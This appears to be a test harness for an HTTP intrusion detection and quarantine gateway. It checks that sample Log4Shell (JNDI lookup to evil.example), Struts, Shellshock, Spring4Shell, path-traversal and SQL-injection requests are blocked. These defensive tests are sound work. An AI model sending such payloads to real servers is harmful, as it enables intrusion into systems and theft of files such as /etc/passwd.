@@ -1,0 +1,81 @@
+// Host assertion harness for the Aegis-IRIS IDS/IPS HTTP inspection & quarantine gateway.
+bring "server.iris"
+
+def main() -> i64 {
+    // 1. URL percent decoding & obfuscation comment normalization
+    assert(decode_url_percent("%2fetc%2fpasswd") == "/etc/passwd");
+    assert(decode_url_percent("%2e%2e%2f%2e%2e%2fetc%2fpasswd") == "../../etc/passwd");
+    assert(decode_url_percent("q=%27OR%201%3d1%27") == "q='OR 1=1'");
+    assert(decode_url_percent("safe%ZZvalue") == "safe%ZZvalue");
+    assert(normalize_input("%2fetc%2f/**/passwd") == "/etc/ passwd");
+    assert(normalize_input("a/**/b") == "a b");
+
+    // 2. CVE signature catalog validation
+    val rules = init_cve_catalog();
+    assert(list_len(rules) == 6);
+
+    // 3. Deep packet inspection against attack & benign requests
+    val log4shell = "GET /api HTTP/1.1\r\nHost: localhost\r\nUser-Agent: ${jndi:ldap://evil.example/x}\r\n\r\n";
+    val r_log4j = inspect_http_request(log4shell, rules);
+    assert(r_log4j.is_blocked);
+    assert(r_log4j.rule_id == "CVE-2021-44228");
+
+    val struts = "POST /upload HTTP/1.1\r\nHost: localhost\r\nContent-Type: %{(#_='multipart/form-data')}\r\n\r\n";
+    val r_struts = inspect_http_request(struts, rules);
+    assert(r_struts.is_blocked);
+    assert(r_struts.rule_id == "CVE-2017-5638");
+
+    val shellshock = "GET /cgi HTTP/1.1\r\nHost: localhost\r\nUser-Agent: () { :;}; echo pwned\r\n\r\n";
+    val r_ss = inspect_http_request(shellshock, rules);
+    assert(r_ss.is_blocked);
+    assert(r_ss.rule_id == "CVE-2014-6271");
+
+    val spring4shell = "POST /form HTTP/1.1\r\nHost: localhost\r\nContent-Length: 28\r\n\r\nclass.module.classLoader=bad";
+    val r_s4s = inspect_http_request(spring4shell, rules);
+    assert(r_s4s.is_blocked);
+    assert(r_s4s.rule_id == "CVE-2022-22965");
+
+    val traversal = "GET /%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1\r\nHost: localhost\r\n\r\n";
+    val r_trav = inspect_http_request(traversal, rules);
+    assert(r_trav.is_blocked);
+    assert(r_trav.rule_id == "CVE-2021-41773");
+
+    val clean_health = "GET /health HTTP/1.1\r\nHost: localhost\r\nUser-Agent: healthcheck/1.0\r\n\r\n";
+    val r_ok = inspect_http_request(clean_health, rules);
+    assert(!r_ok.is_blocked);
+    assert(r_ok.rule_id == "NONE");
+
+    // 4. End-to-end transaction routing + dynamic quarantine escalation
+    val quarantine: list<str> = list();
+
+    val (v1, ip1, resp1) = handle_transaction("GET /health HTTP/1.1\r\nX-Forwarded-For: 10.0.0.5\r\n\r\n", quarantine, rules);
+    assert(v1 == "BENIGN_SERVED");
+    assert(ip1 == "10.0.0.5");
+    assert(contains(resp1, "HTTP/1.1 200 OK"));
+    assert(contains(resp1, "\"status\":\"HEALTHY\""));
+    assert(list_len(quarantine) == 0);
+
+    val (v2, ip2, resp2) = handle_transaction("GET /search?q=ok HTTP/1.1\r\nX-Forwarded-For: 10.0.0.5\r\n\r\n", quarantine, rules);
+    assert(v2 == "BENIGN_SERVED");
+    assert(ip2 == "10.0.0.5");
+    assert(contains(resp2, "HTTP/1.1 200 OK"));
+    assert(contains(resp2, "asset_report.json"));
+
+    val (v3, ip3, resp3) = handle_transaction("GET /../../secret HTTP/1.1\r\nX-Forwarded-For: 192.0.2.99\r\n\r\n", quarantine, rules);
+    assert(v3 == "ATTACK_BLOCKED:CWE-22");
+    assert(ip3 == "192.0.2.99");
+    assert(contains(resp3, "HTTP/1.1 403 Forbidden"));
+    assert(contains(resp3, "BLOCKED_BY_AEGIS_IDS"));
+    assert(list_len(quarantine) == 1);
+
+    // Subsequent otherwise-benign request from quarantined IP must trigger Stage 0 early drop
+    val (v4, ip4, resp4) = handle_transaction("GET /health HTTP/1.1\r\nX-Forwarded-For: 192.0.2.99\r\n\r\n", quarantine, rules);
+    assert(v4 == "QUARANTINE_DROP");
+    assert(ip4 == "192.0.2.99");
+    assert(contains(resp4, "HTTP/1.1 403 Forbidden"));
+    assert(contains(resp4, "BLOCKED_QUARANTINED_IP"));
+
+    println("intrusion_detection_system server harness ok");
+    return 0
+}
+
